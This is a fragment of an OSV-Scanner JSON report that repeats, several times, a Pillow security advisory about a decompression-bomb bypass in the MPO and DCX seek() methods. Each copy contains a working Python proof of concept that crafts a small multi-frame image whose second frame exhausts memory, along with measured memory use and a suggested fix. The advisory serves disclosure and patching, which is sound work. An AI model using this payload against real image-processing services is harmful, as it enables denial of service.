              "fullDescription": {
                "markdown": "### Summary\nPillow's decompression-bomb protection (`Image._decompression_bomb_check`, gated by `Image.MAX_IMAGE_PIXELS`) is enforced only on the **first frame**, inside `Image.open()`. For multi-frame formats, `seek()` re-parses the target frame's header and resets `self._size`. `GifImagePlugin` and `TiffImagePlugin` re-run the bomb check on `seek()`, but **`MpoImageFile.seek()` and `DcxImageFile.seek()` do not.** A crafted MPO or DCX whose first frame is tiny (passing the check) but whose later frame declares enormous dimensions therefore bypasses the protection: loading that frame decodes an over-limit image and commits large amounts of memory — a denial of service (memory exhaustion / OOM).\n\nSame class as the recently assigned CVE-2026-55379 (BdfFontFile), CVE-2026-55380 (GdImageFile) and CVE-2026-40192 (FITS GZIP).\n\n### Details\n`Image.open()` → `_open_core()` runs `_decompression_bomb_check(im.size)` once, on the frame present at open time. Both vulnerable `seek()` methods re-parse a new frame and set a new `self._size` without re-checking:\n\n- **`PIL/MpoImagePlugin.py`, `MpoImageFile.seek()`**: calls `JpegImagePlugin.JpegImageFile._open(self)` (which sets `self._size` from the frame's JPEG SOF) and rebuilds `self.tile`, with no `Image._decompression_bomb_check(self.size)`.\n- **`PIL/DcxImagePlugin.py`, `DcxImageFile.seek()`**: calls `PcxImageFile._open(self)` (which sets `self._size` from the page's PCX header), with no check.\n\nConfirmed present in **12.3.0** (latest release) and on **`main`** (13.0.0.dev0). Compare `GifImagePlugin._seek` and `TiffImagePlugin`, which call `_decompression_bomb_check` correctly on seek.\n\n### PoC\nSelf-contained; the victim uses **default** `MAX_IMAGE_PIXELS`:\n\n```python\nimport io\nfrom PIL import Image\n\n# attacker builds the file (guard disabled only to CREATE the oversized frame)\nImage.MAX_IMAGE_PIXELS = None\nsmall = Image.new(\"RGB\", (8, 8))\nbig   = Image.new(\"RGB\", (14000, 14000), (120, 60, 30))   # 196,000,000 px \u003e error threshold\nbuf = io.BytesIO()\nsmall.save(buf, format=\"MPO\", save_all=True, append_images=[big])\ndata = buf.getvalue()                                      # ~3 MB\nImage.MAX_IMAGE_PIXELS = int(1024 * 1024 * 1024 // 4 // 3) # restore default\n\n# victim (default limits)\nim = Image.open(io.BytesIO(data))   # frame 0 (8x8) passes the bomb check\nim.seek(1)                          # frame 1 (14000x14000) -\u003e NOT re-checked  \u003c-- bug\nim.load()                           # decodes the over-limit image, commits memory\nprint(\"loaded over-limit frame:\", im.size)\n```\n\nMeasured on Pillow 12.3.0 (default limit 89,478,485 px; error threshold 178,956,970 px):\n\n| Vector | File size | Frame 1 | Peak RSS |\n|---|---|---|---|\n| MPO (JPEG) | ~3.0 MB | 14000×14000 (196 Mpx) | ~763 MB |\n| DCX (PCX) | ~6.2 MB | 14000×14000 (196 Mpx) | ~200 MB |\n| Control: same image standalone | — | 196 Mpx | `DecompressionBombError` (correctly blocked) |\n\nThe DCX vector (`0x3ADE68B1` magic + offset directory + two PCX pages) behaves identically via `DcxImageFile.seek()`. Scaling frame 1 toward JPEG's ~65500×65500 maximum drives multi-GB commitments from a small file, reliably OOM-killing the process.\n\n### Impact\nDenial of service (memory exhaustion / OOM) — CWE-400 / CWE-1284, a bypass of Pillow's documented decompression-bomb mitigation. `seek()` + `load()` is the normal way to iterate frames (e.g. `PIL.ImageSequence.Iterator`, thumbnailers, converters, 3D-photo handlers). Because **MPO is auto-detected from a JPEG carrying MPF metadata**, a file served with a `.jpg` extension can be opened as MPO, so any application that iterates frames of untrusted images is exposed.\n\n### Suggested fix\nRe-run the check after `seek()` re-parses a frame, mirroring GIF/TIFF:\n\n```python\n# PIL/MpoImagePlugin.py — end of MpoImageFile.seek()\nself.tile = [ImageFile._Tile(\"jpeg\", (0, 0) + self.size, self.offset, self.tile[0][-1])]\nImage._decompression_bomb_check(self.size)   # add\nself.__frame = frame\n\n# PIL/DcxImagePlugin.py — end of DcxImageFile.seek()\nPcxImageFile._open(self)\nImage._decompression_bomb_check(self.size)   # add\n```",
                "text": "### Summary\nPillow's decompression-bomb protection (`Image._decompression_bomb_check`, gated by `Image.MAX_IMAGE_PIXELS`) is enforced only on the **first frame**, inside `Image.open()`. For multi-frame formats, `seek()` re-parses the target frame's header and resets `self._size`. `GifImagePlugin` and `TiffImagePlugin` re-run the bomb check on `seek()`, but **`MpoImageFile.seek()` and `DcxImageFile.seek()` do not.** A crafted MPO or DCX whose first frame is tiny (passing the check) but whose later frame declares enormous dimensions therefore bypasses the protection: loading that frame decodes an over-limit image and commits large amounts of memory — a denial of service (memory exhaustion / OOM).\n\nSame class as the recently assigned CVE-2026-55379 (BdfFontFile), CVE-2026-55380 (GdImageFile) and CVE-2026-40192 (FITS GZIP).\n\n### Details\n`Image.open()` → `_open_core()` runs `_decompression_bomb_check(im.size)` once, on the frame present at open time. Both vulnerable `seek()` methods re-parse a new frame and set a new `self._size` without re-checking:\n\n- **`PIL/MpoImagePlugin.py`, `MpoImageFile.seek()`**: calls `JpegImagePlugin.JpegImageFile._open(self)` (which sets `self._size` from the frame's JPEG SOF) and rebuilds `self.tile`, with no `Image._decompression_bomb_check(self.size)`.\n- **`PIL/DcxImagePlugin.py`, `DcxImageFile.seek()`**: calls `PcxImageFile._open(self)` (which sets `self._size` from the page's PCX header), with no check.\n\nConfirmed present in **12.3.0** (latest release) and on **`main`** (13.0.0.dev0). Compare `GifImagePlugin._seek` and `TiffImagePlugin`, which call `_decompression_bomb_check` correctly on seek.\n\n### PoC\nSelf-contained; the victim uses **default** `MAX_IMAGE_PIXELS`:\n\n```python\nimport io\nfrom PIL import Image\n\n# attacker builds the file (guard disabled only to CREATE the oversized frame)\nImage.MAX_IMAGE_PIXELS = None\nsmall = Image.new(\"RGB\", (8, 8))\nbig   = Image.new(\"RGB\", (14000, 14000), (120, 60, 30))   # 196,000,000 px \u003e error threshold\nbuf = io.BytesIO()\nsmall.save(buf, format=\"MPO\", save_all=True, append_images=[big])\ndata = buf.getvalue()                                      # ~3 MB\nImage.MAX_IMAGE_PIXELS = int(1024 * 1024 * 1024 // 4 // 3) # restore default\n\n# victim (default limits)\nim = Image.open(io.BytesIO(data))   # frame 0 (8x8) passes the bomb check\nim.seek(1)                          # frame 1 (14000x14000) -\u003e NOT re-checked  \u003c-- bug\nim.load()                           # decodes the over-limit image, commits memory\nprint(\"loaded over-limit frame:\", im.size)\n```\n\nMeasured on Pillow 12.3.0 (default limit 89,478,485 px; error threshold 178,956,970 px):\n\n| Vector | File size | Frame 1 | Peak RSS |\n|---|---|---|---|\n| MPO (JPEG) | ~3.0 MB | 14000×14000 (196 Mpx) | ~763 MB |\n| DCX (PCX) | ~6.2 MB | 14000×14000 (196 Mpx) | ~200 MB |\n| Control: same image standalone | — | 196 Mpx | `DecompressionBombError` (correctly blocked) |\n\nThe DCX vector (`0x3ADE68B1` magic + offset directory + two PCX pages) behaves identically via `DcxImageFile.seek()`. Scaling frame 1 toward JPEG's ~65500×65500 maximum drives multi-GB commitments from a small file, reliably OOM-killing the process.\n\n### Impact\nDenial of service (memory exhaustion / OOM) — CWE-400 / CWE-1284, a bypass of Pillow's documented decompression-bomb mitigation. `seek()` + `load()` is the normal way to iterate frames (e.g. `PIL.ImageSequence.Iterator`, thumbnailers, converters, 3D-photo handlers). Because **MPO is auto-detected from a JPEG carrying MPF metadata**, a file served with a `.jpg` extension can be opened as MPO, so any application that iterates frames of untrusted images is exposed.\n\n### Suggested fix\nRe-run the check after `seek()` re-parses a frame, mirroring GIF/TIFF:\n\n```python\n# PIL/MpoImagePlugin.py — end of MpoImageFile.seek()\nself.tile = [ImageFile._Tile(\"jpeg\", (0, 0) + self.size, self.offset, self.tile[0][-1])]\nImage._decompression_bomb_check(self.size)   # add\nself.__frame = frame\n\n# PIL/DcxImagePlugin.py — end of DcxImageFile.seek()\nPcxImageFile._open(self)\nImage._decompression_bomb_check(self.size)   # add\n```"
              },
              "help": {
                "markdown": "**Your dependency is vulnerable to [CVE-2026-96636](https://osv.dev/CVE-2026-96636)**.\n\n## [GHSA-p8hx-v2p6-rp84](https://osv.dev/GHSA-p8hx-v2p6-rp84)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e Pillow's decompression-bomb protection (`Image._decompression_bomb_check`, gated by `Image.MAX_IMAGE_PIXELS`) is enforced only on the **first frame**, inside `Image.open()`. For multi-frame formats, `seek()` re-parses the target frame's header and resets `self._size`. `GifImagePlugin` and `TiffImagePlugin` re-run the bomb check on `seek()`, but **`MpoImageFile.seek()` and `DcxImageFile.seek()` do not.** A crafted MPO or DCX whose first frame is tiny (passing the check) but whose later frame declares enormous dimensions therefore bypasses the protection: loading that frame decodes an over-limit image and commits large amounts of memory — a denial of service (memory exhaustion / OOM).\n\u003e \n\u003e Same class as the recently assigned CVE-2026-55379 (BdfFontFile), CVE-2026-55380 (GdImageFile) and CVE-2026-40192 (FITS GZIP).\n\u003e \n\u003e ### Details\n\u003e `Image.open()` → `_open_core()` runs `_decompression_bomb_check(im.size)` once, on the frame present at open time. Both vulnerable `seek()` methods re-parse a new frame and set a new `self._size` without re-checking:\n\u003e \n\u003e - **`PIL/MpoImagePlugin.py`, `MpoImageFile.seek()`**: calls `JpegImagePlugin.JpegImageFile._open(self)` (which sets `self._size` from the frame's JPEG SOF) and rebuilds `self.tile`, with no `Image._decompression_bomb_check(self.size)`.\n\u003e - **`PIL/DcxImagePlugin.py`, `DcxImageFile.seek()`**: calls `PcxImageFile._open(self)` (which sets `self._size` from the page's PCX header), with no check.\n\u003e \n\u003e Confirmed present in **12.3.0** (latest release) and on **`main`** (13.0.0.dev0). Compare `GifImagePlugin._seek` and `TiffImagePlugin`, which call `_decompression_bomb_check` correctly on seek.\n\u003e \n\u003e ### PoC\n\u003e Self-contained; the victim uses **default** `MAX_IMAGE_PIXELS`:\n\u003e \n\u003e ```python\n\u003e import io\n\u003e from PIL import Image\n\u003e \n\u003e # attacker builds the file (guard disabled only to CREATE the oversized frame)\n\u003e Image.MAX_IMAGE_PIXELS = None\n\u003e small = Image.new(\"RGB\", (8, 8))\n\u003e big   = Image.new(\"RGB\", (14000, 14000), (120, 60, 30))   # 196,000,000 px \u003e error threshold\n\u003e buf = io.BytesIO()\n\u003e small.save(buf, format=\"MPO\", save_all=True, append_images=[big])\n\u003e data = buf.getvalue()                                      # ~3 MB\n\u003e Image.MAX_IMAGE_PIXELS = int(1024 * 1024 * 1024 // 4 // 3) # restore default\n\u003e \n\u003e # victim (default limits)\n\u003e im = Image.open(io.BytesIO(data))   # frame 0 (8x8) passes the bomb check\n\u003e im.seek(1)                          # frame 1 (14000x14000) -\u003e NOT re-checked  \u003c-- bug\n\u003e im.load()                           # decodes the over-limit image, commits memory\n\u003e print(\"loaded over-limit frame:\", im.size)\n\u003e ```\n\u003e \n\u003e Measured on Pillow 12.3.0 (default limit 89,478,485 px; error threshold 178,956,970 px):\n\u003e \n\u003e | Vector | File size | Frame 1 | Peak RSS |\n\u003e |---|---|---|---|\n\u003e | MPO (JPEG) | ~3.0 MB | 14000×14000 (196 Mpx) | ~763 MB |\n\u003e | DCX (PCX) | ~6.2 MB | 14000×14000 (196 Mpx) | ~200 MB |\n\u003e | Control: same image standalone | — | 196 Mpx | `DecompressionBombError` (correctly blocked) |\n\u003e \n\u003e The DCX vector (`0x3ADE68B1` magic + offset directory + two PCX pages) behaves identically via `DcxImageFile.seek()`. Scaling frame 1 toward JPEG's ~65500×65500 maximum drives multi-GB commitments from a small file, reliably OOM-killing the process.\n\u003e \n\u003e ### Impact\n\u003e Denial of service (memory exhaustion / OOM) — CWE-400 / CWE-1284, a bypass of Pillow's documented decompression-bomb mitigation. `seek()` + `load()` is the normal way to iterate frames (e.g. `PIL.ImageSequence.Iterator`, thumbnailers, converters, 3D-photo handlers). Because **MPO is auto-detected from a JPEG carrying MPF metadata**, a file served with a `.jpg` extension can be opened as MPO, so any application that iterates frames of untrusted images is exposed.\n\u003e \n\u003e ### Suggested fix\n\u003e Re-run the check after `seek()` re-parses a frame, mirroring GIF/TIFF:\n\u003e \n\u003e ```python\n\u003e # PIL/MpoImagePlugin.py — end of MpoImageFile.seek()\n\u003e self.tile = [ImageFile._Tile(\"jpeg\", (0, 0) + self.size, self.offset, self.tile[0][-1])]\n\u003e Image._decompression_bomb_check(self.size)   # add\n\u003e self.__frame = frame\n\u003e \n\u003e # PIL/DcxImagePlugin.py — end of DcxImageFile.seek()\n\u003e PcxImageFile._open(self)\n\u003e Image._decompression_bomb_check(self.size)   # add\n\u003e ```\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-p8hx-v2p6-rp84 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-96636\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-96636](https://osv.dev/CVE-2026-96636)**.\n\n## [GHSA-p8hx-v2p6-rp84](https://osv.dev/GHSA-p8hx-v2p6-rp84)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e Pillow's decompression-bomb protection (`Image._decompression_bomb_check`, gated by `Image.MAX_IMAGE_PIXELS`) is enforced only on the **first frame**, inside `Image.open()`. For multi-frame formats, `seek()` re-parses the target frame's header and resets `self._size`. `GifImagePlugin` and `TiffImagePlugin` re-run the bomb check on `seek()`, but **`MpoImageFile.seek()` and `DcxImageFile.seek()` do not.** A crafted MPO or DCX whose first frame is tiny (passing the check) but whose later frame declares enormous dimensions therefore bypasses the protection: loading that frame decodes an over-limit image and commits large amounts of memory — a denial of service (memory exhaustion / OOM).\n\u003e \n\u003e Same class as the recently assigned CVE-2026-55379 (BdfFontFile), CVE-2026-55380 (GdImageFile) and CVE-2026-40192 (FITS GZIP).\n\u003e \n\u003e ### Details\n\u003e `Image.open()` → `_open_core()` runs `_decompression_bomb_check(im.size)` once, on the frame present at open time. Both vulnerable `seek()` methods re-parse a new frame and set a new `self._size` without re-checking:\n\u003e \n\u003e - **`PIL/MpoImagePlugin.py`, `MpoImageFile.seek()`**: calls `JpegImagePlugin.JpegImageFile._open(self)` (which sets `self._size` from the frame's JPEG SOF) and rebuilds `self.tile`, with no `Image._decompression_bomb_check(self.size)`.\n\u003e - **`PIL/DcxImagePlugin.py`, `DcxImageFile.seek()`**: calls `PcxImageFile._open(self)` (which sets `self._size` from the page's PCX header), with no check.\n\u003e \n\u003e Confirmed present in **12.3.0** (latest release) and on **`main`** (13.0.0.dev0). Compare `GifImagePlugin._seek` and `TiffImagePlugin`, which call `_decompression_bomb_check` correctly on seek.\n\u003e \n\u003e ### PoC\n\u003e Self-contained; the victim uses **default** `MAX_IMAGE_PIXELS`:\n\u003e \n\u003e ```python\n\u003e import io\n\u003e from PIL import Image\n\u003e \n\u003e # attacker builds the file (guard disabled only to CREATE the oversized frame)\n\u003e Image.MAX_IMAGE_PIXELS = None\n\u003e small = Image.new(\"RGB\", (8, 8))\n\u003e big   = Image.new(\"RGB\", (14000, 14000), (120, 60, 30))   # 196,000,000 px \u003e error threshold\n\u003e buf = io.BytesIO()\n\u003e small.save(buf, format=\"MPO\", save_all=True, append_images=[big])\n\u003e data = buf.getvalue()                                      # ~3 MB\n\u003e Image.MAX_IMAGE_PIXELS = int(1024 * 1024 * 1024 // 4 // 3) # restore default\n\u003e \n\u003e # victim (default limits)\n\u003e im = Image.open(io.BytesIO(data))   # frame 0 (8x8) passes the bomb check\n\u003e im.seek(1)                          # frame 1 (14000x14000) -\u003e NOT re-checked  \u003c-- bug\n\u003e im.load()                           # decodes the over-limit image, commits memory\n\u003e print(\"loaded over-limit frame:\", im.size)\n\u003e ```\n\u003e \n\u003e Measured on Pillow 12.3.0 (default limit 89,478,485 px; error threshold 178,956,970 px):\n\u003e \n\u003e | Vector | File size | Frame 1 | Peak RSS |\n\u003e |---|---|---|---|\n\u003e | MPO (JPEG) | ~3.0 MB | 14000×14000 (196 Mpx) | ~763 MB |\n\u003e | DCX (PCX) | ~6.2 MB | 14000×14000 (196 Mpx) | ~200 MB |\n\u003e | Control: same image standalone | — | 196 Mpx | `DecompressionBombError` (correctly blocked) |\n\u003e \n\u003e The DCX vector (`0x3ADE68B1` magic + offset directory + two PCX pages) behaves identically via `DcxImageFile.seek()`. Scaling frame 1 toward JPEG's ~65500×65500 maximum drives multi-GB commitments from a small file, reliably OOM-killing the process.\n\u003e \n\u003e ### Impact\n\u003e Denial of service (memory exhaustion / OOM) — CWE-400 / CWE-1284, a bypass of Pillow's documented decompression-bomb mitigation. `seek()` + `load()` is the normal way to iterate frames (e.g. `PIL.ImageSequence.Iterator`, thumbnailers, converters, 3D-photo handlers). Because **MPO is auto-detected from a JPEG carrying MPF metadata**, a file served with a `.jpg` extension can be opened as MPO, so any application that iterates frames of untrusted images is exposed.\n\u003e \n\u003e ### Suggested fix\n\u003e Re-run the check after `seek()` re-parses a frame, mirroring GIF/TIFF:\n\u003e \n\u003e ```python\n\u003e # PIL/MpoImagePlugin.py — end of MpoImageFile.seek()\n\u003e self.tile = [ImageFile._Tile(\"jpeg\", (0, 0) + self.size, self.offset, self.tile[0][-1])]\n\u003e Image._decompression_bomb_check(self.size)   # add\n\u003e self.__frame = frame\n\u003e \n\u003e # PIL/DcxImagePlugin.py — end of DcxImageFile.seek()\n\u003e PcxImageFile._open(self)\n\u003e Image._decompression_bomb_check(self.size)   # add\n\u003e ```\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-p8hx-v2p6-rp84 | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-96636\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-96636",
